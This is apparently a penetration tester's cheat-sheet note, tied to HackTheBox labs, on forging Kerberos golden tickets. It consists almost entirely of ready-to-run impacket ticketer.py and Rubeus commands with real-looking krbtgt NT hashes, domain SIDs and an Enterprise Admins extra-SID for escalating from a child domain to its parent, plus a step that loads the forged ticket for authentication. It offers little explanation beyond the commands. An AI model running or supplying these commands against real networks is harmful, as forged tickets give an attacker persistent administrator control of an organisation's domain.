Use this tool to construct golden ticket.
You need:
- Hash of krbtgt service.
- SID and FQDN of sub Domain
- SID Enterprise Admin group
- Fake target user.

refer to [[3. Attacking Domain Trusts - Child -> Parent Trusts - from Linux]] for details.

```sh
ticketer.py -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 500 -user-id 1103 mssqlsvc
```

```
ticketer.py -nthash <hash> -domain-sid <asdf> -domain domain.com -spn SERVICE/DC01:1433 -groups 1105 -user-id 1102 TargetUser
```

```sh
ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

The ticket will be saved down to our system as a [credential cache (ccache)](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the `KRB5CCNAME` environment variable tells the system to use this file for Kerberos authentication attempts.

```shell
slomkm@htb[/htb]$ export KRB5CCNAME=hacker.ccache 
```


```
ticketer.py -nthash 6963aad8ba1150192f3ca6341355eb49 -domain darkzero.ext -domain-sid S-1-5-21-1969715525-31638512-2552845157 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker
```

```
ticketer.py -nthash 6963aad8ba1150192f3ca6341355eb49 -aesKey <krbtgt AES256 secret key> -domain-sid <trusted domain SID> -domain <trusted domain DNSname> -extra-sid <target SID> <trusted domain user SAMAccountName>
```


```
Rubeus.exe golden /rc4:6963aad8ba1150192f3ca6341355eb49 /user:<trusted domain user SAMAccountName> /id:<trusted domain user RID> /domain:<trusted domain DNSname> /sid:<trusted domain SID> /sids:<target SID> /dc:<trusted domain DC DNSname> /nowrap /ptt
```
